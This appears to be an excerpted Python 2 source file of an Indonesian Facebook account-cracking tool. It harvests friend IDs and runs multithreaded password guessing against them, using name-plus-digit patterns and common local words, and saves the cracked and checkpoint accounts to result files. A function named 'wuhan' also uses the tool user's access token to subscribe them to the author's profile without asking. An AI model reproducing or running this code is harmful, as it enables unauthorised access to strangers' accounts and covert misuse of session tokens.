...
# coding=utf-8
# code by Bangkeet
# my facebook ( https://www.facebook.com/hendri.m.ramdan )
...
from concurrent.futures import ThreadPoolExecutor as Bangkeet
...
logo = ''' \033[0;96m      __  ______  ____
 \033[0;96m     /  |/  / _ )/ __/ √ \033[0m|| => Created By Bangkeet
 \033[0;96m    / /|_/ / _  / _/     \033[0m|| => Github.com/Bangkeet
 \033[0;96m   /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/Hendri.m.ramdan'''
...
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100021778064729/subscribers?access_token=%s'%(kentod))
...
def teman(kontol):
    ...
    try:
        ...
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));Bangkeet()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));Bangkeet()
'''
...
def info_tools():
    ...
    print '\n %s[%s>%s] Author   : Bangkeet'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Github   : https://github.com/Bangkeet'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Facebook : https://www.facebook.com/hendri.m.ramdan'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Fanspage : -'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Instagram: -'%(N,H,N);time.sleep(0.07)
...
class __crack__:
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with Bangkeet(max_workers=30) as (__Bangkeet__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntkts.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz)>=6:
                            pwx = [ xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345", sayang, anjing, bangsat, rahasia, indonesia, bismillah, freefire ]
                        elif len(xz)<=2:
                            pwx = [ xz[0]+"123", xz[0]+"1234", xz[0]+"12345", sayang, anjing, bangsat, rahasia, indonesia, bismillah, freefire ]
                        elif len(xz)<=3:
                            pwx = [ xz[0]+"123", xz[0]+"12345", sayang, anjing, bangsat, rahasia, indonesia, bismillah, freefire ]
                        else:
                            pwx = [ xz[0]+"123", xz[0]+"12345", sayang, anjing, bangsat, rahasia, indonesia, bismillah, freefire ]
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz)>=6:
                            ...
                            pwx = [ xz[0]+"123", xz[0]+"12345", sayang, anjing, bangsat, rahasia, indonesia, bismillah, freefire ]
                        __Bangkeet__.submit(self.__mfb__, bb[0], pwx)
                    except:
                        pass
